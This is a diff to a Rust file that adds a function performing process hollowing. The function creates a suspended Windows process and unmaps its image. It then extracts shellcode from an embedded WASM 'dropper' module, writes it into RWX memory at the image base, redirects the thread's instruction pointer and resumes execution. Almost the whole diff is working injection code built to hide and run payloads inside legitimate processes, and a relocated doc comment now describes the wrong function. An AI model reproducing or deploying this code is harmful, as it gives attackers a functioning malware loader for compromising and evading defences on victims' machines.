@@ -481,12 +481,271 @@ impl PluginApp {
         Ok(process_info.dwProcessId)
     }
 
-        /// Classic process hollowing for EXEs (not DLLs)
-        /// - Creates a suspended process for `target_exe`
-        /// - Unmaps the original image
-        /// - Maps the provided PE buffer as the new image
-        /// - Sets thread context to new entry point
-        /// - Resumes the main thread
+    pub unsafe fn hollow_process_with_wasm(target_exe: &str) -> anyhow::Result<u32, anyhow::Error> {
+        use windows::Win32::System::Threading::*;
+        use windows::Win32::System::Diagnostics::Debug::*;
+        use windows::Win32::System::Memory::*;
+        use windows::Wdk::System::Threading::PROCESSINFOCLASS;
+        use windows::Wdk::System::Threading::NtQueryInformationProcess;
+        use windows::Wdk::System::Memory::NtUnmapViewOfSection;
+        use std::ffi::c_void;
+
+        log::warn!("[hollow] Starting hollow_process_with_exe + WASM shellcode for target: {}", target_exe);
+
+        // 1. Create suspended process
+        let mut startup_info = STARTUPINFOA::default();
+        let mut process_info = PROCESS_INFORMATION::default();
+        let mut command_line = format!("{}\0", target_exe);
+        let create_res = unsafe {
+            CreateProcessA(
+                None,
+                Some(PSTR(command_line.as_mut_ptr())),
+                None,
+                None,
+                BOOL(0).into(),
+                CREATE_SUSPENDED | DETACHED_PROCESS,
+                None,
+                None,
+                &mut startup_info,
+                &mut process_info,
+            )
+        };
+        log::info!("CreateProcessA Win32: {}", unsafe { GetLastError().to_hresult().message() });
+        if let Err(e) = create_res {
+            log::warn!("[hollow][error] CreateProcessA failed: {}", e);
+            return Err(anyhow::anyhow!("CreateProcessA failed: {}", e));
+        }
+        log::warn!("[hollow] Suspended process created. PID: {}", process_info.dwProcessId);
+
+        let h_process = process_info.hProcess;
+        let h_thread = process_info.hThread;
+
+        // 2. Get remote PEB base address
+        let mut peb_addr_buf = [0u8; 8];
+        let peb_base_addr = {
+            let mut pbi = PROCESS_BASIC_INFORMATION::default();
+            let mut ret_len = 0u32;
+            let status = unsafe {
+                NtQueryInformationProcess(
+                    h_process,
+                    PROCESSINFOCLASS(0),
+                    &mut pbi as *mut _ as *mut c_void,
+                    std::mem::size_of::<PROCESS_BASIC_INFORMATION>() as u32,
+                    &mut ret_len,
+                )
+            };
+            log::info!("NtQueryInformationProcess Win32: {}", unsafe { GetLastError().to_hresult().message() });
+            if status != windows::Win32::Foundation::NTSTATUS(0) {
+                log::warn!("[hollow][error] NtQueryInformationProcess failed: status=0x{:X}", status.0);
+                return Err(anyhow::anyhow!("NtQueryInformationProcess failed: status=0x{:X}", status.0));
+            }
+            log::warn!("[hollow] PebBaseAddress: 0x{:X}", pbi.PebBaseAddress as usize);
+            pbi.PebBaseAddress as usize
+        };
+        let image_base_addr_ptr = (peb_base_addr + 0x10) as *mut c_void;
+        let read_res = unsafe {
+            ReadProcessMemory(
+                h_process, 
+                image_base_addr_ptr, 
+                peb_addr_buf.as_mut_ptr() as _, 
+                8, 
+                None
+            )
+        };
+        log::info!("ReadProcessMemory Win32: {}", unsafe { GetLastError().to_hresult().message() });
+
+        if let Err(e) = read_res {
+            log::warn!("[hollow][error] ReadProcessMemory (PEB image base) failed: {}", e);
+            return Err(anyhow::anyhow!("ReadProcessMemory (PEB image base) failed: {}", e));
+        }
+        let remote_image_base = usize::from_le_bytes(peb_addr_buf);
+        log::warn!("[hollow] Remote image base: 0x{:X}", remote_image_base);
+
+        // 3. Unmap original image so we can allocate executable memory there
+        let unmap_status = unsafe { NtUnmapViewOfSection(h_process, Some(remote_image_base as *mut c_void)) };
+        log::warn!("[hollow] NtUnmapViewOfSection status: 0x{:X}", unmap_status.0);
+        log::info!("NtUnmapViewOfSection Win32: {}", unsafe { GetLastError().to_hresult().message() });
+
+        // ========================= WASM SHELLCODE EXTRACTION =========================
+        log::warn!("[hollow] Starting WASM shellcode extraction...");
+        
+        // Extract shellcode using the same logic as execute_shellcode()
+        let engine = wasmtime::Engine::default();
+        let mut store = wasmtime::Store::new(&engine, ());
+
+        // Embed the .wat file content to avoid path length issues
+        let function = include_str!("wasm_dropper.wat");
+
+        // Create a linker to define required imports
+        let mut linker = wasmtime::Linker::new(&engine);
+
+        // Define __wbindgen_placeholder__.__wbindgen_describe
+        linker.func_wrap(
+            "__wbindgen_placeholder__",
+            "__wbindgen_describe",
+            |_: i32| {
+                // Minimal stub
+                Ok(())
+            },
+        )?;
+
+        // Define __wbindgen_externref_xform__.__wbindgen_externref_table_grow
+        linker.func_wrap(
+            "__wbindgen_externref_xform__",
+            "__wbindgen_externref_table_grow",
+            |size: i32| -> wasmtime::Result<i32> {
+                // Return size as a placeholder
+                Ok(size)
+            },
+        )?;
+
+        // Define __wbindgen_externref_xform__.__wbindgen_externref_table_set_null
+        linker.func_wrap(
+            "__wbindgen_externref_xform__",
+            "__wbindgen_externref_table_set_null",
+            |_: i32| {
+                // Minimal stub
+                Ok(())
+            },
+        )?;
+
+        // Compile the module from string
+        let module = wasmtime::Module::new(&engine, function)?;
+        log::warn!("[hollow] WASM Module instantiated");
+
+        // Instantiate with linker
+        let instance = linker.instantiate(&mut store, &module)?;
+        log::warn!("[hollow] WASM Instance instantiated");
+
+        // Get exported functions
+        let read_func = instance
+            .get_func(&mut store, "read_wasm_at_index")
+            .expect("`read_wasm_at_index` was not an exported function")
+            .typed::<u32, u32>(&store)?;
+
+        let mem_size_func = instance
+            .get_func(&mut store, "get_wasm_mem_size")
+            .expect("couldn't get mem size")
+            .typed::<(), u32>(&store)?;
+
+        let buff_size = mem_size_func.call(&mut store, ())?;
+        let mut shellcode_buffer: Vec<u8> = vec![0x00; buff_size as usize];
+
+        log::warn!("[hollow] WASM shellcode buffer size: {}", buff_size);
+
+        // Copy shellcode from WASM to buffer
+        for i in 0..buff_size {
+            shellcode_buffer[i as usize] = read_func.call(&mut store, i)? as u8;
+        }
+
+        log::warn!("[hollow] WASM shellcode extracted successfully");
+        
+        // Log first few bytes of shellcode for debugging
+        log::warn!("[hollow] Shellcode first 16 bytes: {:02X?}", &shellcode_buffer[..16.min(buff_size as usize)]);
+
+        // ========================= REMOTE INJECTION =========================
+
+        // 4. Allocate executable memory at the original image base  
+        log::warn!("[hollow] Attempting to allocate {} bytes at image base for shellcode", buff_size);
+        let new_base = unsafe {
+            VirtualAllocEx(
+                h_process,
+                Some(remote_image_base as *mut c_void),
+                buff_size as usize,
+                MEM_COMMIT | MEM_RESERVE,
+                PAGE_EXECUTE_READWRITE,
+            )
+        };
+
+        if new_base.is_null() {
+            log::error!("[hollow] VirtualAllocEx at image base failed");
+            log::info!("VirtualAllocEx Win32 Error: {}", unsafe { GetLastError().to_hresult().message() });
+            let _ = unsafe { TerminateProcess(h_process, 1) };
+            let _ = unsafe { CloseHandle(h_process) };
+            return Err(anyhow::anyhow!("VirtualAllocEx at image base failed: {}", unsafe { GetLastError().to_hresult().message() }));
+        }
+
+        log::warn!("[hollow] Allocated executable memory at: 0x{:X}", new_base as usize);
+
+        // 5. Write shellcode to the allocated memory
+        let mut bytes_written = 0;
+        let write_result = unsafe {
+            WriteProcessMemory(
+                h_process,
+                new_base,
+                shellcode_buffer.as_ptr() as *const c_void,
+                buff_size as usize,
+                Some(&mut bytes_written),
+            )
+        };
+
+        if write_result.is_err() {
+            log::error!("[hollow] WriteProcessMemory (shellcode) failed");
+            log::info!("WriteProcessMemory Win32 Error: {}", unsafe { GetLastError().to_hresult().message() });
+            let _ = unsafe { TerminateProcess(h_process, 1) };
+            let _ = unsafe { CloseHandle(h_process) };
+            return Err(anyhow::anyhow!("WriteProcessMemory failed: {}", unsafe { GetLastError().to_hresult().message() }));
+        }
+
+        log::warn!("[hollow] Wrote {} bytes of shellcode to 0x{:X}", bytes_written, new_base as usize);
+
+        // 6. Set thread context to point to the shellcode
+        let mut context = CONTEXT::default();
+        #[cfg(target_arch = "x86_64")]
+        {
+            context.ContextFlags = CONTEXT_ALL_AMD64;
+        }
+        #[cfg(target_arch = "x86")]
+        {
+            context.ContextFlags = CONTEXT_ALL_X86;
+        }
+        let get_ctx_res = unsafe { GetThreadContext(h_thread, &mut context) };
+        if let Err(e) = get_ctx_res {
+            log::warn!("[hollow][error] GetThreadContext failed: {}", e);
+            return Err(anyhow::anyhow!("GetThreadContext failed: {}", e));
+        }
+        
+        // Store original RSP for stack setup
+        let original_rsp = context.Rsp;
+        log::warn!("[hollow] Original RSP: 0x{:X}", original_rsp);
+        
+        #[cfg(target_arch = "x86_64")]
+        {
+            context.Rip = new_base as u64;
+            context.Rsp = (original_rsp & !0xF) - 0x20;
+            log::warn!("[hollow] Set CONTEXT.Rip = 0x{:X} (shellcode at allocated memory)", context.Rip);
+            log::warn!("[hollow] Set CONTEXT.Rsp = 0x{:X} (aligned stack)", context.Rsp);
+        }
+        #[cfg(target_arch = "x86")]
+        {
+            context.Eip = new_base as u32;
+            context.Esp = (context.Esp & !0xF) - 0x10;
+            log::warn!("[hollow] Set CONTEXT.Eip = 0x{:X} (shellcode at allocated memory)", context.Eip);
+            log::warn!("[hollow] Set CONTEXT.Esp = 0x{:X} (aligned stack)", context.Esp);
+        }
+        let set_ctx_res = unsafe { SetThreadContext(h_thread, &context) };
+        if let Err(e) = set_ctx_res {
+            log::warn!("[hollow][error] SetThreadContext failed: {}", e);
+            return Err(anyhow::anyhow!("SetThreadContext failed: {}", e));
+        }
+
+        log::warn!("[hollow] Thread context set to execute shellcode at original image base");
+        // Note: ResumeThread should be called by the caller when ready to execute
+
+        let resume = unsafe { ResumeThread(h_thread) };
+        log::warn!("Resumed thread: {resume}");
+
+        log::warn!("[hollow] Process hollowing with WASM shellcode complete. PID: {}", process_info.dwProcessId);
+        Ok(process_info.dwProcessId)
+    }
+
+    /// Classic process hollowing with direct WASM shellcode injection
+    /// - Creates a suspended process for `target_exe`
+    /// - Unmaps the original image
+    /// - Extracts shellcode from WASM module
+    /// - Injects shellcode into the hollowed process
+    /// - Sets thread context to shellcode entry point
+    /// - Resumes the main thread
     pub unsafe fn hollow_process_with_exe_original(pe_data: &[u8], target_exe: &str) -> anyhow::Result<u32, anyhow::Error> {
         use windows::Win32::System::Threading::*;
         use windows::Win32::System::Diagnostics::Debug::*;
